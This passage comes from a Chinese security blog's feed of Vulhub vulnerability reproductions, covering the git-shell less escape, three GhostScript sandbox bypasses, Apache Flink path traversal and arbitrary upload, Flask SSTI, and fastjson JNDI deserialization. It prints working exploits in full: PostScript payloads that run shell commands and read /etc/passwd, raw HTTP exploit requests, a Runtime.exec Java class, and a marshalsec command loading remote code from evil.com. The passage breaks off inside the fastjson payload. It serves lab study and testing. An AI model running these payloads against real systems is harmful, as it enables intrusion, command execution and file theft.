<li><code>git-upload-archive &lt;argument&gt;</code></li>
</ul>
<p>这就是白名单。</p>
<p>但CVE-2017-8386的作者发现，执行<code>git-upload-archive --help</code>（或<code>git-receive-pack --help</code>），将会进入一个交互式的man页面，man又调用了less命令，最后是一个可以上下翻页的帮助文档。</p>
<p>本来这也没什么，但是，less命令有一个特性，就是其支持一些交互式的方法。比如在less页面中，按<code>shift</code>+e可以打开Examine功能，通过这个功能可以读取任意文件；输入<code>!id</code>就可以执行id这个命令。</p>
<p>可以随便找台linux计算机试一下，执行<code>less /etc/passwd</code>来到less的页面，然后在英文输入法下输入<code>!id</code>，就可以执行id命令：</p>
<p>所以，利用这个特性，我们就可以绕过git-shell的沙盒读取任意文件，或执行任意命令了！</p>
<p>我们可以先试试，在Linux下直接执行<code>git-receive-pack --help</code>，再输入<code>!id</code>，看到的效果和上图是类似的。</p>
<p><a href="https://evi1cg.me/archives/CVE-2017-8386.html" target="_blank" rel="noopener">evi1cg大佬的博客</a>中有动图，看的更直观。</p>
<h3 id="通过ssh进行利用"><a href="#通过ssh进行利用" class="headerlink" title="通过ssh进行利用"></a>通过ssh进行利用</h3><p>那么，如何远程利用这个漏洞？</p>
<p>我们前面试了，直接<code>ssh git@gitserver</code>只能拿到git-shell（或返回一段提醒文字），我们就利用上一节里提到的沙盒绕过漏洞执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 3322 -i id_rsa -t git@127.0.0.1 &quot;git-upload-archive &#39;--help&#39;&quot;</span><br></pre></td></tr></table></figure>

<p>进入帮助页面，然后按shift+e或<code>!id</code>即可。</p>
<h3 id="一些限制"><a href="#一些限制" class="headerlink" title="一些限制"></a>一些限制</h3><p>我前文说了，一般配置git用户，不让ssh拥有shell，有两种方法：一是创建用户的时候设置其shell为<code>/usr/bin/git-shell</code>，二是在authorized_keys中覆盖command。</p>
<p>如果目标服务器使用了第一种方法，我们即使成功执行了<code>git-upload-archive &#39;--help&#39;</code>进入帮助页面，也不能执行命令。因为<code>!id</code>还是在git-shell下执行，git-shell中没有id命令，所以依旧执行不成功。</p>
<p>但读取文件是一定可以的，因为读取文件不是通过命令读取的，所以不受git-shell沙盒的影响。</p>
<p>如果目标服务器是用第二种方法配置的git-shell，比如我这里这个测试环境，我是在<code>/etc/passwd</code>文件设置git用户的shell是bash，而在authorized_keys中覆盖command，执行git-shell。</p>
<p>这种情况下，如果我进入了帮助页面，输入<code>!id</code>是可以成功执行id命令的，因为此时id是在bash下执行的，而不是在git-shell下执行的，所以没有沙盒限制。</p>
<p>总的来说，这个漏洞至少能做到任意文件读取，有可能可以执行任意命令。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>GIT</tag>
      </tags>
  </entry>
  <entry>
    <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</title>
    <url>/2021/08/03/GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6116%EF%BC%89/</url>
    <content><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h1><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p>
<p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2</a></li>
<li><a href="https://www.anquanke.com/post/id/170255" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170255</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将可以看到一个上传组件。</p>
<p>poc.png</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%!PS</span><br><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span><br><span class="line">&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def</span><br><span class="line"></span><br><span class="line">&#x2F;exploit &#123;</span><br><span class="line">    (Stage 11: Exploitation...)&#x3D;</span><br><span class="line"></span><br><span class="line">    &#x2F;forceput exch def</span><br><span class="line"></span><br><span class="line">    systemdict &#x2F;SAFER false forceput</span><br><span class="line">    userparams &#x2F;LockFilePermissions false forceput</span><br><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput</span><br><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput</span><br><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput</span><br><span class="line"></span><br><span class="line">    % update</span><br><span class="line">    save restore</span><br><span class="line"></span><br><span class="line">    % All done.</span><br><span class="line">    stop</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">errordict &#x2F;typecheck &#123;</span><br><span class="line">    &#x2F;typecount typecount 1 add def</span><br><span class="line">    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    % The first error will be the .knownget, which we handle and setup the</span><br><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span><br><span class="line">    % dump the operands.</span><br><span class="line">    typecount 1 eq &#123; null &#125; if</span><br><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span><br><span class="line">    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if</span><br><span class="line">&#125; put</span><br><span class="line"></span><br><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span><br><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span><br><span class="line">% marked as executeonly or pseudo-operators.</span><br><span class="line">%</span><br><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span><br><span class="line">% fail because when the routine was declared, it used &#96;bind&#96; but many of the</span><br><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span><br><span class="line">%</span><br><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span><br><span class="line">% works.</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;typecount      0</span><br><span class="line">    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;</span><br><span class="line">    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack</span><br><span class="line">    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op</span><br><span class="line">    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index</span><br><span class="line">    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;</span><br><span class="line">        % cause a &#x2F;typecheck error we handle above</span><br><span class="line">        true</span><br><span class="line">    &#125;</span><br><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span><br><span class="line"></span><br><span class="line">(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;</span><br><span class="line"></span><br><span class="line">% Demonstrate reading a file we shouldnt have access to.</span><br><span class="line">(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile</span><br><span class="line"></span><br><span class="line">(Attempting to execute a shell command...)&#x3D; flush</span><br><span class="line"></span><br><span class="line">% run command</span><br><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success) (w) file closefile</span><br><span class="line"></span><br><span class="line">(All done.)&#x3D;</span><br><span class="line"></span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>上传这个文件，即可执行<code>id &gt; /tmp/success</code>：</p>
<p><img src="https://image.3001.net/images/20210803/16279564819919.png" alt="image-20210802160743738"></p>
<p>我们也可以用<code>docker run -it --rm --name uu -v</code>pwd<code>/poc.png:/tmp/poc.png vulhub/imagemagick:7.0.8-27-php identify /tmp/poc.png</code>来直接测试poc：</p>
<p><img src="https://image.3001.net/images/20210803/16279564834289.png" alt="image-20210802161118686"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>GhostScript</tag>
      </tags>
  </entry>
  <entry>
    <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</title>
    <url>/2021/08/03/GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-19475%EF%BC%89/</url>
    <content><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h1><p>2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://blog.semmle.com/ghostscript-CVE-2018-19475/" target="_blank" rel="noopener">https://blog.semmle.com/ghostscript-CVE-2018-19475/</a></li>
<li><a href="https://bugs.ghostscript.com/show_bug.cgi?id=700153" target="_blank" rel="noopener">https://bugs.ghostscript.com/show_bug.cgi?id=700153</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将可以看到一个上传组件。</p>
<p>将POC作为图片上传，执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryukZmnyhO</span><br><span class="line">Content-Length: 279</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryukZmnyhO</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_upload&quot;; filename&#x3D;&quot;1.jpg&quot;</span><br><span class="line">content-Type&#x3D;&quot;image&#x2F;png&quot;</span><br><span class="line"></span><br><span class="line">%!PS</span><br><span class="line">0 1 300367 &#123;&#125; for</span><br><span class="line">&#123;save restore&#125; stopped &#123;&#125; if</span><br><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) (w) file</span><br><span class="line">------WebKitFormBoundaryukZmnyhO--</span><br></pre></td></tr></table></figure>

<p>命令已成功执行</p>
<p><img src="https://image.3001.net/images/20210803/16279565265753.png" alt="image-20210802154222234"></p>
<p>当然，真实环境下通常无法直接回显漏洞执行结果，你需要使用带外攻击的方式来检测漏洞。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>GhostScript</tag>
      </tags>
  </entry>
  <entry>
    <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</title>
    <url>/2021/08/03/GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-16509%EF%BC%89/</url>
    <content><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</h1><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞：</p>
<ul>
<li><a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">http://seclists.org/oss-sec/2018/q3/142</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></li>
</ul>
<p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将可以看到一个上传组件。</p>
<p>poc.png</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict &#x2F;setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark &#x2F;OutputFile (%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>

<p>上传<a href="https://github.com/vulhub/vulhub/blob/master/ghostscript/CVE-2018-16509/poc.png" target="_blank" rel="noopener">poc.png</a>，将执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>。此时进入容器<code>docker-compose exec web bash</code>，将可以看到/tmp/success已被创建：</p>
<p><img src="https://image.3001.net/images/20210803/1627956211542.png" alt="image-20210802153333116"></p>
<p><img src="https://image.3001.net/images/20210803/16279562147310.png" alt="image-20210802153426131"></p>
<p>你也可以使用命令行测试该漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --rm --name im -v &#96;pwd&#96;&#x2F;poc.png:&#x2F;poc.png vulhub&#x2F;imagemagick:7.0.8-10 convert &#x2F;poc.png &#x2F;poc.gif</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210803/16279562164625.png" alt="image-20210802153156184"></p>
<p>可见，id命令已被成功运行。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>GhostScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Flink `jobmanager/logs` 路径遍历 (CVE-2020-17519)</title>
    <url>/2021/08/02/Apache%20Flink%20jobmanager-logs%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%20(CVE-2020-17519)/</url>
    <content><![CDATA[<h1 id="Apache-Flink-jobmanager-logs-路径遍历-CVE-2020-17519"><a href="#Apache-Flink-jobmanager-logs-路径遍历-CVE-2020-17519" class="headerlink" title="Apache Flink jobmanager/logs 路径遍历 (CVE-2020-17519)"></a>Apache Flink <code>jobmanager/logs</code> 路径遍历 (CVE-2020-17519)</h1><p>Apache Flink 是一个开源的流处理框架，具有强大的流处理和批处理能力。</p>
<p>Apache Flink 1.11.0 中引入的更改（以及在 1.11.1 和 1.11.2 中发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件。</p>
<p>参考：</p>
<ul>
<li><a href="https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801" target="_blank" rel="noopener">https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17519" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-17519</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Apache Flink 启动后，访问<code>http://192.168.44.132:8081</code>查看主页。</p>
<p>查看<code>/etc/passwd</code>文件内容，访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210802/16278897684216.png" alt="image-20210802143248275"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Flink 上传路径遍历 (CVE-2020-17518)</title>
    <url>/2021/08/02/Apache%20Flink%20%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%20(CVE-2020-17518)/</url>
    <content><![CDATA[<h1 id="Apache-Flink-上传路径遍历-CVE-2020-17518"><a href="#Apache-Flink-上传路径遍历-CVE-2020-17518" class="headerlink" title="Apache Flink 上传路径遍历 (CVE-2020-17518)"></a>Apache Flink 上传路径遍历 (CVE-2020-17518)</h1><p>Apache Flink 是一个开源的流处理框架，具有强大的流处理和批处理能力。</p>
<p>Apache Flink 1.5.1 引入了 REST 处理程序，允许您通过恶意修改的 HTTP HEADER 将上传的文件写入本地文件系统上的任意位置。</p>
<p>参考：</p>
<ul>
<li><a href="https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4" target="_blank" rel="noopener">https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17518" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-17518</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Apache Flink 启动后，访问<code>http://192.168.44.132:8081</code>查看主页。</p>
<p>使用以下请求将文件上传到<code>/tmp/success</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210802/16278897778124.png" alt="image-20210802142521033"></p>
<p>查看<code>/tmp</code>文件夹内，成功上传success文件</p>
<p><img src="https://image.3001.net/images/20210802/16278897801388.png" alt="image-20210802142614447"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask（Jinja2） 服务端模板注入漏洞</title>
    <url>/2021/07/22/Flask%EF%BC%88Jinja2%EF%BC%89%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><p>参考文章：</p>
<ul>
<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li>
<li><a href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates" target="_blank" rel="noopener">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132/?name=49</code>，得到49，说明SSTI漏洞存在。</p>
<p><img src="https://image.3001.net/images/20210722/16269359288107.png" alt="image-20210722141001147"></p>
<p>获取eval函数并执行任意python代码的POC：</p>
<p><img src="https://image.3001.net/images/20210803/16279577635357.png" alt="image-20210803102916576"></p>
<p><img src="https://image.3001.net/images/20210803/16279577953454.png" alt="image-20210803102944551"></p>
<p><img src="https://image.3001.net/images/20210722/16269359314215.png" alt="image-20210722141128939"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>jinja2</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 1.2.24 反序列化导致任意命令执行漏洞</title>
    <url>/2021/07/21/fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
<a id="more"></a>

<p>参考资料：</p>
<ul>
<li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li>
<li>[<a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/04/29/title-" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-</a> fastjson 远程反序列化poc的构造和分析/)</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://192.168.44.132:8090</code>即可看到JSON格式的输出。</p>
<p><img src="https://image.3001.net/images/20210721/16268479292335.png" alt="image-20210720165705779"></p>
<p>我们向这个地址POST一个JSON对象，即可更新服务端的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.44.132:8090&#x2F; -H &quot;Content-Type: application&#x2F;json&quot; --data &#39;&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210721/16268479338336.png" alt="image-20210720173523189"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8090</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.164 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210721/16268479359558.png" alt="image-20210720170306920"></p>
<p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p>
<p>首先编译并上传命令执行代码，如<code>http://192.168.44.132/TouchFile.class</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210721/16268479408749.png" alt="image-20210720205159578"></p>
<p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;evil.com&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210721/16268479449284.png" alt="image-20210720203256114"></p>
<p>向靶场服务器发送Payload，带上RMI的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.44.132:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span 